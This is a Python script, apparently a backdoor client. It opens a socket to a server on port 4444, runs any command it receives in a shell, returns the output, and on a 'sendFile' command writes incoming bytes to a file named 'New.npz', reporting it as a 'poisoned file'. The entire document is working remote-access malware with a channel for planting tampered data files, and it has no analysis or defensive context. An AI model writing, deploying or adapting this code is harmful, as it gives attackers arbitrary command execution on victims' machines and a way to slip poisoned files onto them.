import socket
import os
import subprocess


BUFFER_SIZE = 4096

h_name = socket.gethostname()
server_ip = socket.gethostbyname(h_name)
port = 4444
backdoor = socket.socket()
backdoor.connect((server_ip, port))

while True:
    command = backdoor.recv(1024)
    command = command.decode()
    if (command != "sendFile"):
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        if (output != b'' or output_error != b''):
            backdoor.send(output + output_error)
        else:
            output = f"{command} was executed successfully !"
            output = output.encode()
            backdoor.send(output + output_error)

    else:
        # print(command)
        with open("New.npz", "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                bytes_read = backdoor.recv(BUFFER_SIZE)
                # print(bytes_read)
                # print()
                if bytes_read.endswith(b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'):    
                    # Last bytes
                    bytes_read = list(bytes_read)
                    for i in range(-10,0):
                        bytes_read.pop(i)
                    bytes_read = bytes(bytes_read)

                    # write last bytes to the file the bytes we just received
                    f.write(bytes_read)
                    print('file transmitting is done')
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)

            print("file transmitting is done")
            output = "Poisoned file received successfully !"
            output = output.encode()
            backdoor.send(output)
